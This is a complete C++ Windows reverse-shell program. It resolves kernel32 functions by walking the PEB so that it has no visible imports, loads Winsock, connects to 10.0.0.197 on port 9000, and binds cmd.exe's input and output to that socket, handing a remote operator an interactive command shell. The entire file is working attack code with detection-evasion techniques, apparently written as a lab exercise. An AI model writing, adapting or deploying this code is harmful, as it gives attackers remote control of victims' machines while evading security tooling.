// ReverseShell.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include "peb_lookup.h"

int main(){
    // Get Address Of Kernel32
    LPVOID base = get_module_by_name((const LPWSTR)L"kernel32.dll");
    if (!base)
        return 1;
    LPVOID load_lib = get_func_by_name((HMODULE)base,(LPSTR)"LoadLibraryA");
    if (!load_lib)
        return 1;
    LPVOID get_proc = get_func_by_name((HMODULE)base,(LPSTR)"GetProcAddress");
    if (!get_proc)
        return 1;
    LPVOID exit_thread = get_func_by_name((HMODULE)base,(LPSTR)"ExitThread");
    // define function definitions we just acquired
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
    void(WINAPI *_ExitThread)(DWORD dwExitCode) = (void(WINAPI*)(DWORD))exit_thread;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE,LPCSTR))get_proc;
    // Load needed libraries 
    LPVOID w2_32_dll = _LoadLibraryA("Ws2_32.dll");
    LPVOID u32_dll = _LoadLibraryA("user32.dll");
    LPVOID shell32_dll = _LoadLibraryA("Shell32.dll");
    // create function definitons
    typedef unsigned long(WINAPI * pMessageBoxA)(IN  HWND, IN LPCSTR, IN LPCSTR, IN UINT);
    pMessageBoxA _MessageBoxA = (pMessageBoxA)_GetProcAddress((HMODULE)u32_dll,"MessageBoxA");

    typedef unsigned long(WINAPI *pWSAStartup)(IN WORD, OUT LPWSADATA);
    pWSAStartup _WsaStartup = (pWSAStartup)_GetProcAddress((HMODULE)w2_32_dll,"WSAStartup");

    typedef unsigned long(WINAPI *pWSASocketA)(IN int,IN int,IN int,IN LPVOID,IN int, IN DWORD);
    pWSASocketA _WSASocketA = (pWSAStartup)_GetProcAddress((HMODULE)w2_32_dll,"WSASocketA");

    typedef unsigned long(WINAPI *phtons)(IN u_short);
    phtons _htons = (phtons)_GetProcAddress((HMODULE)w2_32_dll,"htons");
    typedef unsigned long (WINAPI * pinet_addr)(IN const char*);
    pinet_addr _inet_addr = (pinet_addr)_GetProcAddress((HMODULE)w2_32_dll,"inet_addr");

    typedef unsigned long (WINAPI * pWSAConnect)(IN SOCKET,IN void*,IN int, IN LPVOID,OUT LPVOID,IN LPVOID,IN LPVOID);
    pWSAConnect _WSAConnect = (pWSAConnect)_GetProcAddress((HMODULE)w2_32_dll,"WSAConnect");

    typedef unsigned long (WINAPI * pCreateProcessA)(IN  LPCSTR,IN LPSTR,IN LPSECURITY_ATTRIBUTES, IN LPSECURITY_ATTRIBUTES,IN BOOL,IN DWORD,IN LPVOID,IN LPCSTR,IN LPSTARTUPINFOA,IN LPPROCESS_INFORMATION);
    pCreateProcessA _CreateProcessA = (pCreateProcessA)_GetProcAddress((HMODULE)base,"CreateProcessA");


    // start
    if (_MessageBoxA == NULL) return 1;

    //_MessageBoxA(0,"Hello World","Demo",MB_OK);
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax;
    STARTUPINFOA ini_processo;
    PROCESS_INFORMATION processo_info;
    if (_WsaStartup(MAKEWORD(2, 2), &wsaData) != 0){
        _MessageBoxA(0,"","startup failed",MB_OK);
    }
    Winsock = _WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    if (Winsock == NULL){
        _MessageBoxA(0,"","sock failed",MB_OK);
    }
    hax.sin_port = _htons(9000);
    hax.sin_family = AF_INET;
    hax.sin_addr.s_addr = _inet_addr("10.0.0.197");

    if(_WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) != 0){
        _MessageBoxA(0,"","conn failed",MB_OK);
    }
    SecureZeroMemory(&ini_processo, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    _CreateProcessA(NULL, (LPSTR)"cmd", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    return 0;
}
